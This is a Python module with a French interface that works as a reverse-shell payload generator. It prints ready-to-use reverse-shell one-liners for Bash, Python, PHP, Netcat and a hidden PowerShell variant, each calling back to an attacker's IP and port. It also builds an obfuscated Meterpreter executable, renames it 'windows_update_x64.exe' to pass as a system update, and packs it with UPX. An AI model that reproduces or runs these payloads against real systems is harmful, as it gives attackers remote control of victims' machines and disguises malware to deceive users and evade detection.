# modules/payload_gen.py
import os
import subprocess

def generate_payload():
    print("=== Générateur de Payloads Amélioré ===\n")
    ip = input("🔹 LHOST (Votre IP) : ").strip()
    port = input("🔹 LPORT (Port d'écoute) : ").strip()

    options = {
        "1": ("Bash", f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
        "2": ("Python", f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"),
        "3": ("PHP", f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        "4": ("Netcat", f"nc -e /bin/sh {ip} {port}"),
        "5": ("PowerShell", f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{{{0}}}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}}};$client.Close()\""""),
        "6": ("EXE Meterpreter x64", f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -e x64/xor_dynamic -i 5 -o reverse_shell_x64.exe")
    }

    print("\n📦 Choisissez le type de payload à générer :")
    for key, (label, _) in options.items():
        print(f"[{key}] {label}")

    choice = input("\n>>> Votre choix : ").strip()

    if choice in options:
        label, payload = options[choice]
        print(f"\n[✓] Payload {label} généré :\n")
        print(f"{'-'*60}\n{payload}\n{'-'*60}")

        if "msfvenom" in payload:
            confirm = input("\n🕛 Exécuter la commande msfvenom pour générer l'exe ? (y/n): ").lower()
            if confirm == 'y':
                print("[*] Génération du fichier .exe...")
                try:
                    subprocess.run(payload, shell=True, check=True)

                    obfuscated_name = "windows_update_x64.exe"
                    os.rename("reverse_shell_x64.exe", obfuscated_name)

                    print("[*] Compression avec UPX...")
                    subprocess.run(f"upx --ultra-brute {obfuscated_name}", shell=True, check=True)

                    print(f"[✓] Fichier final prêt : {obfuscated_name}")
                    print("[!] Utilisez un handler Meterpreter pour écouter sur le port choisi.")
                except subprocess.CalledProcessError as e:
                    print(f"[!] Erreur : {e}")
            return

        save = input("\n📂 Sauvegarder dans un fichier ? (y/n): ").strip().lower()
        if save == 'y':
            filename = f"payload_{label.lower().replace(' ', '_')}.txt"
            with open(filename, "w") as f:
                f.write(payload)
            print(f"[+] Sauvegardé sous: {filename}")
    else:
        print("[!] Choix invalide.")
